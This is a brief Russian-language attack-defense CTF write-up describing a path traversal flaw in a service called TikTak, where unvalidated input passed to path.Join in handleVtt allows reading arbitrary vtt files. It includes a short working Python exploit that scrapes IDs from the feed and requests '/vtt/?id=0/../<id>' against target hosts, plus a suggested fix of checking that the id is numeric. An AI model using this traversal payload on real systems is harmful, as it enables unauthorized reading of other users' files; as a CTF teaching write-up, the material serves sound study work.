# Path traversal в TikTak

Отсутствие проверки в handleVtt и использование path.Join с пользовательским вводом приводит к чтению произовльных vtt файлов

sploit для destructive farm

```python
import requests
import sys
import re


base_url = "http://" + sys.argv[1] + ":4000"

ids = re.findall(r'D:</b> (\d+)<', requests.get(base_url + '/feed').text)

for id_ in ids:
    print(id_)
    print(requests.get(base_url + "/vtt/?id=0/../" + id_).text)
```

Один из вариантов исправления - проверять, что id это число:
![](https://github.com/ArturLukianov/ADWriteups/blob/master/images/tiktak-traversal/Screenshot%20from%202020-05-09%2013-13-06.png)

